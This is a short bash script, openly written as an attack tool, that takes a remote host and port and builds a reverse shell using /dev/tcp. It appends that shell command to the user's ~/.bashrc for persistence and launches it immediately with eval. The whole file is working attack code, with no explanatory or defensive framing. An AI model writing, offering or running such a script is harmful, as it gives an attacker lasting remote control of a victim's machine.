#!/bin/bash

status="\033[1;34m\033[m"
good="\033[1;32m[+]\033[m"
error="\033[1;91m[-]\033[m"

if [[ $# -lt 2 ]]; then
    echo -e "${error} Missing RHOST and RPORT!"
    exit 1
fi

payload="sh -i >& /dev/tcp/$1/$2 0>&1 &> /dev/null &"

function infect_bashrc {
    echo "${payload}" >> ~/.bashrc
    echo -e "${good} Successfully infected bashrc"
}

function launch_final_payload {
    eval ${payload}
    echo -e "${good} Successfully launched final payload"
}

infect_bashrc
launch_final_payload
